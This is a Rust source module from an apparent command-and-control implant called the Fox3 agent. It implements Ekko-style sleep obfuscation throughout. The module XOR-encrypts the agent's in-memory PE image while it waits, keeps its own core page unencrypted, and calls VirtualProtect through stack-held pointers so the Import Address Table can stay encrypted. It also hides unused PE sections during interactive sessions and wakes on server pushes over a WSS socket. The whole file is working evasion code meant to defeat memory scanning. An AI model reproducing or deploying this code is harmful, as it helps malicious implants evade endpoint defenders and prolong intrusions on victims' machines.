/// Ekko-style sleep encryption for Fox3 agent.
///
/// Encrypts the agent's PE image (.text, .rdata, .data) in memory during sleep
/// so that only decrypted bytes exist while the agent is actively executing.
///
/// # Page-skip approach
///
/// A single `#[inline(never)]` function (`ekko_core`) contains the
/// encrypt → wait → decrypt loop.  Its containing 4KB page is skipped
/// during encryption so it can execute.  All other image pages are XORed
/// with a random 16-byte key generated per sleep cycle.
///
/// # IAT survival
///
/// `ekko_core` calls VirtualProtect and WaitForMultipleObjectsEx through
/// pre-resolved function pointers stored on the stack (via `EkkoParams`).
/// The Import Address Table lives in the PE image and gets encrypted, but
/// stack-based pointers survive because the stack is outside the PE image.
///
/// # WSS integration
///
/// When a WSS transport is connected, `WSAEventSelect` registers the raw
/// TCP socket with a kernel event.  The kernel signals that event when data
/// arrives — no user-mode code needed.  The event is included in the
/// `WaitForMultipleObjectsEx` call so the agent wakes instantly on server
/// push while memory is encrypted.

#[cfg(windows)]
mod imp {
    use std::cell::Cell;
    use std::ffi::c_void;
    use std::ptr;
    use std::time::Duration;

    // ── Constants ────────────────────────────────────────────────────────────
    const PAGE_READWRITE: u32 = 0x04;
    const PAGE_NOACCESS: u32  = 0x01;
    const PAGE_GUARD: u32     = 0x100;
    const WAIT_OBJECT_0: u32  = 0;
    #[allow(dead_code)]
    const WAIT_TIMEOUT: u32   = 0x102;
    const FD_READ: i32        = 0x01;
    const FD_CLOSE: i32       = 0x20;
    const FIONBIO: i32        = -2147195266i32; // 0x8004667E as i32

    // ── Raw FFI declarations ─────────────────────────────────────────────────
    // We use raw FFI (not windows-sys) for the functions that ekko_core calls
    // through pre-resolved pointers.  Setup/teardown code uses these directly.

    extern "system" {
        fn GetModuleHandleW(name: *const u16) -> *mut c_void;
        fn GetModuleHandleA(name: *const u8) -> *mut c_void;
        fn GetProcAddress(module: *mut c_void, name: *const u8) -> *mut c_void;
        fn VirtualQuery(addr: *const c_void, buf: *mut MemoryBasicInformation, len: usize) -> usize;
        fn CreateEventW(attrs: *const c_void, manual_reset: i32, initial: i32, name: *const u16) -> *mut c_void;
        fn CloseHandle(handle: *mut c_void) -> i32;
    }

    // WSAEventSelect and ioctlsocket — for WSS socket event registration
    extern "system" {
        fn WSAEventSelect(socket: usize, event: *mut c_void, net_events: i32) -> i32;
        fn ioctlsocket(socket: usize, cmd: i32, argp: *mut u32) -> i32;
    }

    // Function pointer types for ekko_core (called through stack-based pointers)
    type VirtualProtectFn = unsafe extern "system" fn(
        addr: *mut c_void,
        size: usize,
        new_protect: u32,
        old_protect: *mut u32,
    ) -> i32;

    type WaitForMultipleObjectsExFn = unsafe extern "system" fn(
        count: u32,
        handles: *const *mut c_void,
        wait_all: i32,
        ms: u32,
        alertable: i32,
    ) -> u32;

    // ── MEMORY_BASIC_INFORMATION ─────────────────────────────────────────────
    #[repr(C)]
    struct MemoryBasicInformation {
        base_address:       *mut c_void,
        allocation_base:    *mut c_void,
        allocation_protect: u32,
        _pad1:              u32, // PartitionId on x64
        region_size:        usize,
        state:              u32,
        protect:            u32,
        type_:              u32,
        _pad2:              u32,
    }

    // ── MemRegion: one contiguous region to encrypt ──────────────────────────
    #[derive(Clone, Copy)]
    struct MemRegion {
        base:    *mut u8,
        size:    usize,
        protect: u32,
    }

    // SAFETY: MemRegion holds raw pointers that are only dereferenced on the
    // original thread (main agent loop).  They are never sent across threads.
    unsafe impl Send for MemRegion {}
    unsafe impl Sync for MemRegion {}

    // ── EkkoParams: passed to ekko_core on the stack ─────────────────────────
    const MAX_REGIONS: usize = 128;

    #[repr(C)]
    struct EkkoParams {
        fn_virtual_protect: VirtualProtectFn,
        fn_wait_multiple:   WaitForMultipleObjectsExFn,
        handles:            [*mut c_void; 3],
        handle_count:       u32,
        timeout_ms:         u32,
        key:                [u8; 16],
        num_regions:        usize,
        regions:            [CoreRegion; MAX_REGIONS],
    }

    #[repr(C)]
    #[derive(Clone, Copy)]
    struct CoreRegion {
        base:    *mut u8,
        size:    usize,
        protect: u32,
    }

    // ── EkkoSleep: public handle ─────────────────────────────────────────────

    #[allow(dead_code)]
    pub struct EkkoSleep {
        image_base:          *mut u8,
        image_size:          usize,
        regions:             Vec<MemRegion>,
        core_page:           usize,
        /// First page AFTER the ekko_core+xor_regions code range (exclusive end).
        core_end_page:       usize,
        ws_event:            *mut c_void,
        fn_virtual_protect:  VirtualProtectFn,
        fn_wait_multiple:    WaitForMultipleObjectsExFn,
        /// Cold regions: PE headers, .reloc, .rsrc, .pdata — never needed at runtime.
        /// Encrypted during interactive operations to keep unused PE metadata hidden.
        cold_regions:        Vec<MemRegion>,
        /// Persistent XOR key for cold region encryption (generated once at init).
        cold_key:            [u8; 16],
        /// Whether cold regions are currently encrypted.
        cold_encrypted:      Cell<bool>,
    }

    // SAFETY: EkkoSleep is only used from the main agent thread.
    // The raw pointers reference the process's own PE image.
    unsafe impl Send for EkkoSleep {}

    /// Wait result from encrypted_wait.
    #[derive(Debug, Clone, Copy, PartialEq)]
    pub enum WaitResult {
        /// Wake event was signaled (SOCKS data from background thread).
        WakeEvent,
        /// WSS socket has data available.
        WssData,
        /// Timeout expired (normal sleep completion).
        Timeout,
    }

    impl EkkoSleep {
        /// Initialize sleep encryption.  Measures the PE image, collects page
        /// regions, resolves function pointers, and creates the WSS event.
        ///
        /// Returns None if any step fails (graceful fallback to unencrypted sleep).
        pub fn new() -> Option<Self> {
            // Ekko relies on inline(always) being honoured for xor_regions.
            // Debug builds do not guarantee inlining, so xor_regions may land
            // outside the [ekko_core, ekko_core_end) page range and get
            // encrypted — causing a segfault on the decrypt call.
            // Disable gracefully in debug; release builds are fine.
            #[cfg(debug_assertions)]
            {
                crate::dbg_print!("[ekko] disabled in debug build (inline not guaranteed)");
                return None;
            }
            #[cfg(not(debug_assertions))]
            unsafe {
                // ── Measure PE image ─────────────────────────────────────────
                let base = GetModuleHandleW(ptr::null()) as *mut u8;
                if base.is_null() {
                    crate::dbg_print!("[ekko] GetModuleHandleW failed");
                    return None;
                }

                // Parse PE headers: base + e_lfanew → PE signature → Optional header → SizeOfImage
                let e_lfanew = *(base.add(0x3C) as *const u32) as usize;
                let pe_sig = base.add(e_lfanew);
                // PE signature (4) + COFF header (20) = Optional header at offset 24
                let opt_hdr = pe_sig.add(24);
                // SizeOfImage is at offset 56 in the Optional header (PE32+)
                let size_of_image = *(opt_hdr.add(56) as *const u32) as usize;

                if size_of_image == 0 || size_of_image > 256 * 1024 * 1024 {
                    crate::dbg_print!("[ekko] suspicious SizeOfImage: {}", size_of_image);
                    return None;
                }

                // ── Identify ekko_core's page range ──────────────────────────
                let core_addr     = ekko_core as *const () as usize;
                let core_end_addr = ekko_core_end as *const () as usize;
                let core_page     = core_addr & !0xFFF;
                // Round up to next page boundary to cover the full function range.
                let core_end_page = (core_end_addr + 0xFFF) & !0xFFF;

                // ── Collect memory regions via VirtualQuery ───────────────────
                let mut regions = Vec::new();
                let image_end = base as usize + size_of_image;
                let mut addr = base as usize;

                while addr < image_end {
                    let mut mbi = std::mem::zeroed::<MemoryBasicInformation>();
                    let ret = VirtualQuery(
                        addr as *const c_void,
                        &mut mbi,
                        std::mem::size_of::<MemoryBasicInformation>(),
                    );
                    if ret == 0 {
                        break;
                    }

                    let region_base = mbi.base_address as usize;
                    let region_size = mbi.region_size;
                    let protect = mbi.protect;

                    // Skip non-accessible or guard pages
                    if protect == 0 || protect == PAGE_NOACCESS || (protect & PAGE_GUARD) != 0 {
                        addr = region_base + region_size;
                        continue;
                    }

                    // Split around the ekko_core page
                    let region_end = region_base + region_size;

                    // Check if this region overlaps [core_page, core_end_page)
                    let overlaps_core = core_page < region_end && core_end_page > region_base;
                    if overlaps_core {
                        // Part before the core range
                        let skip_start = core_page.max(region_base);
                        let skip_end   = core_end_page.min(region_end);
                        if skip_start > region_base {
                            regions.push(MemRegion {
                                base:    region_base as *mut u8,
                                size:    skip_start - region_base,
                                protect,
                            });
                        }
                        // Part after the core range
                        if skip_end < region_end {
                            regions.push(MemRegion {
                                base:    skip_end as *mut u8,
                                size:    region_end - skip_end,
                                protect,
                            });
                        }
                    } else {
                        // Entire region gets encrypted
                        regions.push(MemRegion {
                            base:    region_base as *mut u8,
                            size:    region_size,
                            protect,
                        });
                    }

                    addr = region_base + region_size;
                }

                if regions.is_empty() {
                    crate::dbg_print!("[ekko] no encryptable regions found");
                    return None;
                }

                // ── Identify cold PE sections ──────────────────────────────
                // Cold sections are PE metadata never accessed at runtime:
                // PE headers, .reloc (relocations already applied), .rsrc,
                // .pdata (exception tables already registered with OS).
                // These stay encrypted during interactive operations.
                let coff_hdr = pe_sig.add(4); // skip PE\0\0 signature
                let num_sections = *(coff_hdr as *const u16) as usize;
                let size_opt_hdr = *(coff_hdr.add(16) as *const u16) as usize;
                let section_table = coff_hdr.add(20 + size_opt_hdr);

                let mut cold_ranges: Vec<(usize, usize)> = Vec::new();

                // PE headers area (DOS header, PE headers, section table)
                // is always cold — loader already processed these.
                let first_section_va = if num_sections > 0 {
                    *(section_table.add(12) as *const u32) as usize
                } else {
                    0x1000
                };
                if first_section_va > 0 {
                    cold_ranges.push((base as usize, base as usize + first_section_va));
                }

                // Walk section table and tag metadata sections as cold.
                for i in 0..num_sections {
                    let sec = section_table.add(i * 40);
                    let name = std::slice::from_raw_parts(sec, 8);
                    let vsize = *(sec.add(8) as *const u32) as usize;
                    let va = *(sec.add(12) as *const u32) as usize;

                    let is_cold = name.starts_with(b".reloc\0")
                        || name.starts_with(b".rsrc\0")
                        || name.starts_with(b".pdata\0");

                    if is_cold && vsize > 0 {
                        let sec_start = base as usize + va;
                        let sec_end = sec_start + vsize;
                        cold_ranges.push((sec_start, sec_end));
                    }
                }

                // Build cold_regions: regions entirely within a cold range.
                // We only include regions fully contained in cold ranges to
                // avoid accidentally encrypting hot code at section boundaries.
                let cold_regions: Vec<MemRegion> = regions.iter()
                    .filter(|r| {
                        let r_start = r.base as usize;
                        let r_end = r_start + r.size;
                        cold_ranges.iter().any(|(cs, ce)| r_start >= *cs && r_end <= *ce)
                    })
                    .cloned()
                    .collect();

                let cold_key: [u8; 16] = {
                    use rand::Rng;
                    rand::thread_rng().gen()
                };

                // ── Resolve function pointers ────────────────────────────────
                let kernel32 = GetModuleHandleA(b"kernel32.dll\0".as_ptr());
                if kernel32.is_null() {
                    crate::dbg_print!("[ekko] GetModuleHandleA(kernel32) failed");
                    return None;
                }

                let fn_vp = GetProcAddress(kernel32, b"VirtualProtect\0".as_ptr());
                let fn_wait = GetProcAddress(kernel32, b"WaitForMultipleObjectsEx\0".as_ptr());

                if fn_vp.is_null() || fn_wait.is_null() {
                    crate::dbg_print!("[ekko] GetProcAddress failed for VirtualProtect or WaitForMultipleObjectsEx");
                    return None;
                }

                let fn_virtual_protect: VirtualProtectFn = std::mem::transmute(fn_vp);
                let fn_wait_multiple: WaitForMultipleObjectsExFn = std::mem::transmute(fn_wait);

                // ── Create WSS socket event ──────────────────────────────────
                let ws_event = CreateEventW(ptr::null(), 0, 0, ptr::null());
                if ws_event.is_null() {
                    crate::dbg_print!("[ekko] CreateEventW for WSS socket failed");
                    return None;
                }

                let total_bytes: usize = regions.iter().map(|r| r.size).sum();
                let cold_bytes: usize = cold_regions.iter().map(|r| r.size).sum();
                crate::dbg_print!(
                    "[ekko] initialized: {} regions ({} bytes), {} cold ({} bytes), core=[0x{:X}..0x{:X}), image=[0x{:X}..0x{:X})",
                    regions.len(), total_bytes, cold_regions.len(), cold_bytes,
                    core_page, core_end_page, base as usize, image_end
                );

                Some(Self {
                    image_base: base,
                    image_size: size_of_image,
                    regions,
                    core_page,
                    core_end_page,
                    ws_event,
                    fn_virtual_protect,
                    fn_wait_multiple,
                    cold_regions,
                    cold_key,
                    cold_encrypted: Cell::new(false),
                })
            }
        }

        /// Perform one encrypted sleep cycle.
        ///
        /// 1. Generate random XOR key
        /// 2. Optionally register WSS socket event
        /// 3. Call ekko_core (encrypt → wait → decrypt)
        /// 4. Clean up WSS event registration
        /// 5. Return which event fired
        pub fn encrypted_wait(
            &self,
            duration:    Duration,
            wake_handle: *mut c_void,
            wss_socket:  Option<u64>,
        ) -> WaitResult {
            use rand::Rng;

            // Generate random 16-byte XOR key for this sleep cycle
            let key: [u8; 16] = rand::thread_rng().gen();

            let timeout_ms = duration.as_millis().min(u32::MAX as u128) as u32;

            // Build handles array: [wake_event, ws_event?]
            let mut handles: [*mut c_void; 3] = [ptr::null_mut(); 3];
            let mut handle_count: u32 = 1;
            handles[0] = wake_handle;

            // Register WSS socket event if connected
            if let Some(socket) = wss_socket {
                unsafe {
                    WSAEventSelect(socket as usize, self.ws_event, FD_READ | FD_CLOSE);
                }
                handles[1] = self.ws_event;
                handle_count = 2;
            }

            // Build EkkoParams on the stack
            let mut params = EkkoParams {
                fn_virtual_protect: self.fn_virtual_protect,
                fn_wait_multiple:   self.fn_wait_multiple,
                handles,
                handle_count,
                timeout_ms,
                key,
                num_regions: self.regions.len().min(MAX_REGIONS),
                regions: [CoreRegion { base: ptr::null_mut(), size: 0, protect: 0 }; MAX_REGIONS],
            };

            // Copy region info to stack-based array
            for (i, r) in self.regions.iter().enumerate().take(MAX_REGIONS) {
                params.regions[i] = CoreRegion {
                    base:    r.base,
                    size:    r.size,
                    protect: r.protect,
                };
            }

            // ── Call the page-skip stub ──────────────────────────────────────
            let wait_result = unsafe { ekko_core(&params) };

            // ── Clean up WSS socket event ────────────────────────────────────
            if let Some(socket) = wss_socket {
                unsafe {
                    // Deregister the event association
                    WSAEventSelect(socket as usize, self.ws_event, 0);
                    // Restore blocking mode (WSAEventSelect sets non-blocking)
                    let mut zero: u32 = 0;
                    ioctlsocket(socket as usize, FIONBIO, &mut zero);
                }
            }

            // Interpret wait result
            match wait_result {
                WAIT_OBJECT_0     => WaitResult::WakeEvent,
                r if r == WAIT_OBJECT_0 + 1 && wss_socket.is_some()
                                  => WaitResult::WssData,
                _                 => WaitResult::Timeout,
            }
        }

        /// Encrypt cold PE sections (headers, .reloc, .rsrc, .pdata).
        /// Called when entering interactive mode to keep unused metadata hidden.
        /// Idempotent — no-op if already encrypted.
        pub fn encrypt_cold(&self) {
            if self.cold_encrypted.get() || self.cold_regions.is_empty() {
                return;
            }
            unsafe {
                for r in &self.cold_regions {
                    let mut old_protect = 0u32;
                    (self.fn_virtual_protect)(
                        r.base as *mut c_void, r.size, PAGE_READWRITE, &mut old_protect,
                    );
                    xor_single_region(&self.cold_key, r.base, r.size);
                    let mut dummy = 0u32;
                    (self.fn_virtual_protect)(
                        r.base as *mut c_void, r.size, old_protect, &mut dummy,
                    );
                }
            }
            self.cold_encrypted.set(true);
        }

        /// Decrypt cold PE sections.
        /// Called when exiting interactive mode before resuming full Ekko sleep.
        /// Idempotent — no-op if already decrypted.
        pub fn decrypt_cold(&self) {
            if !self.cold_encrypted.get() || self.cold_regions.is_empty() {
                return;
            }
            unsafe {
                for r in &self.cold_regions {
                    let mut old_protect = 0u32;
                    (self.fn_virtual_protect)(
                        r.base as *mut c_void, r.size, PAGE_READWRITE, &mut old_protect,
                    );
                    xor_single_region(&self.cold_key, r.base, r.size);
                    let mut dummy = 0u32;
                    (self.fn_virtual_protect)(
                        r.base as *mut c_void, r.size, old_protect, &mut dummy,
                    );
                }
            }
            self.cold_encrypted.set(false);
        }

        /// Returns true if cold sections are currently encrypted.
        #[allow(dead_code)]
        pub fn cold_encrypted(&self) -> bool {
            self.cold_encrypted.get()
        }
    }

    /// XOR a single memory region with a 16-byte key (u64-wide for speed).
    /// Used by encrypt_cold / decrypt_cold during normal execution (outside ekko_core).
    unsafe fn xor_single_region(key: &[u8; 16], base: *mut u8, size: usize) {
        let k0 = u64::from_ne_bytes([
            key[0], key[1], key[2], key[3],
            key[4], key[5], key[6], key[7],
        ]);
        let k1 = u64::from_ne_bytes([
            key[8],  key[9],  key[10], key[11],
            key[12], key[13], key[14], key[15],
        ]);

        let mut ptr = base;
        let end = base.add(size);

        while ptr.add(16) <= end {
            let p0 = ptr as *mut u64;
            let p1 = ptr.add(8) as *mut u64;
            *p0 ^= k0;
            *p1 ^= k1;
            ptr = ptr.add(16);
        }
        if ptr.add(8) <= end {
            let p0 = ptr as *mut u64;
            *p0 ^= k0;
            ptr = ptr.add(8);
        }
        let mut ki = 0usize;
        while ptr < end {
            *ptr ^= key[ki & 0xF];
            ptr = ptr.add(1);
            ki += 1;
        }
    }

    impl Drop for EkkoSleep {
        fn drop(&mut self) {
            if !self.ws_event.is_null() {
                unsafe { CloseHandle(self.ws_event); }
            }
        }
    }

    // ── The page-skip stub ───────────────────────────────────────────────────
    //
    // This function's 4KB page is excluded from encryption.  Everything it does
    // uses either:
    //   - Function pointers from `params` (on stack, outside PE image)
    //   - Inline pointer arithmetic + XOR (no function calls)
    //   - Constants embedded in its own machine code (on the skipped page)
    //
    // NO references to the IAT, .rdata string literals, or global variables.

    #[inline(never)]
    unsafe fn ekko_core(params: *const EkkoParams) -> u32 {
        let p = &*params;

        // ── 1. VirtualProtect all regions → PAGE_READWRITE ───────────────
        let mut old_protects: [u32; MAX_REGIONS] = [0u32; MAX_REGIONS];
        for i in 0..p.num_regions {
            let r = &p.regions[i];
            (p.fn_virtual_protect)(
                r.base as *mut c_void,
                r.size,
                PAGE_READWRITE,
                &mut old_protects[i],
            );
        }

        // ── 2. XOR encrypt (inline, no function calls) ──────────────────
        xor_regions(&p.key, &p.regions, p.num_regions);

        // ── 3. Wait ─────────────────────────────────────────────────────
        let result = (p.fn_wait_multiple)(
            p.handle_count,
            p.handles.as_ptr(),
            0,  // bWaitAll = FALSE
            p.timeout_ms,
            1,  // bAlertable = TRUE
        );

        // ── 4. XOR decrypt (same key = toggle) ─────────────────────────
        xor_regions(&p.key, &p.regions, p.num_regions);

        // ── 5. Restore original page protections ────────────────────────
        for i in 0..p.num_regions {
            let r = &p.regions[i];
            let mut dummy = 0u32;
            (p.fn_virtual_protect)(
                r.base as *mut c_void,
                r.size,
                old_protects[i],
                &mut dummy,
            );
        }

        result
    }

    /// XOR all regions with the 16-byte key.  Processes in u64 chunks for speed.
    ///
    /// Marked `#[inline(always)]` so it is folded into `ekko_core` — the
    /// combined code stays within the range [ekko_core, ekko_core_end).
    #[inline(always)]
    unsafe fn xor_regions(key: &[u8; 16], regions: &[CoreRegion; MAX_REGIONS], count: usize) {
        // Build two u64 key words for fast 8-byte XOR
        let k0 = u64::from_ne_bytes([
            key[0], key[1], key[2], key[3],
            key[4], key[5], key[6], key[7],
        ]);
        let k1 = u64::from_ne_bytes([
            key[8],  key[9],  key[10], key[11],
            key[12], key[13], key[14], key[15],
        ]);

        for i in 0..count {
            let r = &regions[i];
            let mut ptr = r.base;
            let end = r.base.add(r.size);

            // XOR in 16-byte (two u64) chunks
            while ptr.add(16) <= end {
                let p0 = ptr as *mut u64;
                let p1 = ptr.add(8) as *mut u64;
                *p0 ^= k0;
                *p1 ^= k1;
                ptr = ptr.add(16);
            }

            // Handle remaining 8-byte chunk
            if ptr.add(8) <= end {
                let p0 = ptr as *mut u64;
                *p0 ^= k0;
                ptr = ptr.add(8);
            }

            // Handle remaining bytes
            let mut ki = 0usize;
            while ptr < end {
                *ptr ^= key[ki & 0xF];
                ptr = ptr.add(1);
                ki += 1;
            }
        }
    }

    /// Sentinel placed immediately after `xor_regions` so the linker emits a
    /// symbol that marks the end of the ekko_core+xor_regions code range.
    /// Its address (rounded up to a page) is used in `EkkoSleep::new()` to
    /// skip ALL pages that `ekko_core` spans — not just its entry page.
    #[inline(never)]
    unsafe fn ekko_core_end() {}
}

// ── Non-Windows stub ─────────────────────────────────────────────────────────

#[cfg(not(windows))]
mod imp {
    use std::time::Duration;

    #[derive(Debug, Clone, Copy, PartialEq)]
    pub enum WaitResult {
        WakeEvent,
        WssData,
        Timeout,
    }

    pub struct EkkoSleep;

    impl EkkoSleep {
        pub fn new() -> Option<Self> {
            None // No-op on non-Windows
        }

        pub fn encrypted_wait(
            &self,
            _duration:    Duration,
            _wake_handle: *mut std::ffi::c_void,
            _wss_socket:  Option<u64>,
        ) -> WaitResult {
            WaitResult::Timeout
        }

        pub fn encrypt_cold(&self) {}
        pub fn decrypt_cold(&self) {}
        pub fn cold_encrypted(&self) -> bool { false }
    }
}

pub use imp::{EkkoSleep, WaitResult};
